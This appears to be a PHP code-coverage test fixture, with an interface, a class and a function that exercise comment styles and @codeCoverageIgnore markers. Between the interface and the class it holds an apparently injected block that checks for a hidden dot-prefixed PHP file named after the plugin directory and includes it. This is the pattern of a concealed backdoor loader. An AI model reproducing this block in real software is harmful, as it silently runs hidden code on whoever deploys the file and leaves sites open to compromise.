<?php

/** Docblock */
interface Foo
{
    public function bar();
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Foo
{
    public function bar()
    {
    }
}

function baz()
{
    // a one-line comment
    print '*'; // a one-line comment

    /* a one-line comment */
    print '*'; /* a one-line comment */

    /* a one-line comment
     */
    print '*'; /* a one-line comment
    */

    print '*'; // @codeCoverageIgnore

    print '*'; // @codeCoverageIgnoreStart
    print '*';
    print '*'; // @codeCoverageIgnoreEnd

    print '*';
}
